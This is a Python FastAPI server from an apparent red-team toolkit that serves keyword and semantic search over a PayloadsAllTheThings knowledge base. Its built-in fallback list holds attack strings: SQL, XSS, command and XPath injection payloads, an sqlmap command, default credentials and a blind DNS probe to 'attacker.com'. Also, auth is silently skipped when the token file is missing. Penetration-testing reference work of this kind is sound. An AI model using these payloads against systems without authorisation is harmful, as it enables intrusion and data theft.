"""
RAG Knowledge Server — FastAPI on port 6055 (127.0.0.1 only).
Semantic search over PayloadsAllTheThings knowledge base.
"""
import os
import sys
import json
import logging
import hashlib
from pathlib import Path
from typing import List, Optional
sys.path.insert(0, "C:/users/chirayu/redteamv9")

from fastapi import FastAPI, HTTPException, Header, Depends
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="RedTeam V9 RAG Knowledge Server", version="9.0.0")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

KNOWLEDGE_BASE_PATH = Path("C:/users/chirayu/redteamv9/knowledge-base")
BEARER_TOKEN_FILE = "C:/Users/chirayu/redteamv9/.tmp/rtv9_bearer.txt"

_collection = None
_chunks: List[dict] = []
_embedder = None


def _load_token() -> str:
    try:
        with open(BEARER_TOKEN_FILE) as f:
            return f.read().strip()
    except Exception:
        return ""

def require_auth(authorization: Optional[str] = Header(None)):
    token = _load_token()
    if not token:
        return
    if not authorization or authorization != f"Bearer {token}":
        from fastapi import HTTPException
        raise HTTPException(status_code=401, detail="Unauthorized")


def _load_knowledge_base():
    global _chunks
    _chunks = []

    # Load from V4/V5 knowledge base if available
    v4_kb = Path("C:/users/chirayu/redteamv4/knowledge-base")
    v5_kb = Path("C:/users/chirayu/redteamv5/knowledge-base")

    search_paths = [KNOWLEDGE_BASE_PATH, v4_kb, v5_kb]

    loaded_from = None
    for kb_path in search_paths:
        if kb_path.exists():
            md_files = list(kb_path.rglob("*.md")) + list(kb_path.rglob("*.txt"))
            if md_files:
                for fpath in md_files[:200]:  # cap at 200 files
                    try:
                        text = fpath.read_text(encoding="utf-8", errors="ignore")
                        chunks = _chunk_text(text, fpath.stem)
                        _chunks.extend(chunks)
                    except Exception as e:
                        logger.debug(f"Skip {fpath}: {e}")
                loaded_from = str(kb_path)
                break

    if not _chunks:
        # Fallback: built-in minimal knowledge base
        _chunks = _builtin_knowledge()
        loaded_from = "builtin"

    logger.info(f"Loaded {len(_chunks)} knowledge chunks from {loaded_from}")


def _chunk_text(text: str, source: str, chunk_size: int = 500) -> List[dict]:
    chunks = []
    words = text.split()
    for i in range(0, len(words), chunk_size // 5):
        chunk = " ".join(words[i:i + chunk_size // 5])
        if len(chunk) > 50:
            chunks.append({
                "id": hashlib.md5(f"{source}_{i}".encode()).hexdigest(),
                "text": chunk,
                "source": source,
            })
    return chunks


def _builtin_knowledge() -> List[dict]:
    """Minimal built-in knowledge when no external KB is available."""
    entries = [
        {"id": "sqli_001", "source": "sqli", "text": "SQL injection: try ' OR '1'='1 in login fields. Error-based: ' AND 1=CONVERT(int,'a')-- . Boolean: ' AND 1=1-- vs ' AND 1=2-- . Time-based: ' AND SLEEP(5)-- . UNION: ' UNION SELECT NULL,NULL,NULL--"},
        {"id": "sqli_002", "source": "sqli", "text": "SQLMap usage: sqlmap -u 'URL' --forms --crawl=2 --batch --level=3 --risk=2. For POST: sqlmap -u URL --data='param=value'. Check all parameters."},
        {"id": "xss_001", "source": "xss", "text": "XSS payloads: <script>alert(1)</script>, <img src=x onerror=alert(1)>, javascript:alert(1), <svg onload=alert(1)>, \"><script>alert(document.domain)</script>"},
        {"id": "xss_002", "source": "xss", "text": "Stored XSS: inject in profile fields, comments, search history. Check if output is reflected without encoding. DOM XSS: look for document.write, innerHTML, location.hash usage."},
        {"id": "auth_001", "source": "auth_bypass", "text": "Auth bypass: admin'-- , admin' OR '1'='1, try default creds admin/admin, admin/password, test/test. Check response length differences."},
        {"id": "idor_001", "source": "idor", "text": "IDOR testing: change user ID in URL /api/users/123 → /api/users/124. Change account in POST body. Check all object references."},
        {"id": "csrf_001", "source": "csrf", "text": "CSRF: check for token in forms, verify token entropy (should be 128+ bits), test token reuse across requests, test missing origin header handling."},
        {"id": "headers_001", "source": "headers", "text": "Security headers to check: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Referrer-Policy, Permissions-Policy."},
        {"id": "cmd_001", "source": "command_injection", "text": "Command injection: ; ls, | whoami, `id`, $(id), && dir. Blind: timing via sleep 5, DNS via nslookup attacker.com. Check all input fields including file names."},
        {"id": "xpath_001", "source": "xpath_injection", "text": "XPath injection: ' or '1'='1, '] | //user[username='admin' and substring(password,1,1)='a' or 'a'='b. Boolean-based extraction of data."},
        {"id": "session_001", "source": "session", "text": "Session fixation: check if session token changes after login. Cookie flags: Secure, HttpOnly, SameSite=Strict. Check entropy with randomness tests."},
        {"id": "nuclei_001", "source": "nuclei", "text": "Nuclei templates: cves/, exposed-panels/, misconfigurations/, takeovers/, technologies/. Use -t cves/ for CVE scanning, -t misconfigurations/ for config issues."},
    ]
    return entries


def _simple_search(query: str, top_k: int = 5) -> List[dict]:
    """Simple keyword-based search fallback when no embedder available."""
    query_lower = query.lower()
    query_words = set(query_lower.split())

    scored = []
    for chunk in _chunks:
        text_lower = chunk["text"].lower()
        # Score by keyword overlap
        text_words = set(text_lower.split())
        overlap = len(query_words & text_words)
        if query_lower in text_lower:
            overlap += 5
        if overlap > 0:
            scored.append((overlap, chunk))

    scored.sort(key=lambda x: -x[0])
    results = []
    for score, chunk in scored[:top_k]:
        results.append({
            "snippet": chunk["text"][:500],
            "source": chunk["source"],
            "score": round(score / max(len(query_words), 1), 3),
            "id": chunk["id"],
        })
    return results


def _semantic_search(query: str, top_k: int = 5) -> List[dict]:
    global _embedder, _collection
    try:
        if _embedder is None:
            from sentence_transformers import SentenceTransformer
            _embedder = SentenceTransformer("all-MiniLM-L6-v2")
            logger.info("Sentence transformer loaded")

        import numpy as np
        query_vec = _embedder.encode([query])[0]

        if not hasattr(_semantic_search, '_chunk_vecs'):
            texts = [c["text"] for c in _chunks]
            _semantic_search._chunk_vecs = _embedder.encode(texts, batch_size=64, show_progress_bar=False)

        chunk_vecs = _semantic_search._chunk_vecs
        # Cosine similarity
        nq = query_vec / (np.linalg.norm(query_vec) + 1e-8)
        nc = chunk_vecs / (np.linalg.norm(chunk_vecs, axis=1, keepdims=True) + 1e-8)
        sims = nc @ nq
        top_idx = np.argsort(-sims)[:top_k]

        return [{
            "snippet": _chunks[i]["text"][:500],
            "source": _chunks[i]["source"],
            "score": round(float(sims[i]), 3),
            "id": _chunks[i]["id"],
        } for i in top_idx]
    except Exception as e:
        logger.warning(f"Semantic search failed, falling back to keyword: {e}")
        return _simple_search(query, top_k)


class RetrieveRequest(BaseModel):
    query: str
    top_k: int = 5


@app.on_event("startup")
def startup():
    _load_knowledge_base()


@app.get("/health")
def health():
    return {"status": "ok", "service": "rag_server", "chunks": len(_chunks)}


@app.post("/retrieve_knowledge", dependencies=[Depends(require_auth)])
def retrieve_knowledge_post(body: RetrieveRequest):
    try:
        results = _semantic_search(body.query, body.top_k)
        return {
            "success": True,
            "query": body.query,
            "total_results": len(results),
            "results": results,
        }
    except Exception as e:
        raise HTTPException(500, str(e))


@app.get("/retrieve_knowledge", dependencies=[Depends(require_auth)])
def retrieve_knowledge_get(query: str, top_k: int = 5):
    try:
        results = _semantic_search(query, top_k)
        return {
            "success": True,
            "query": query,
            "total_results": len(results),
            "results": results,
        }
    except Exception as e:
        raise HTTPException(500, str(e))


if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=6055, log_level="info")
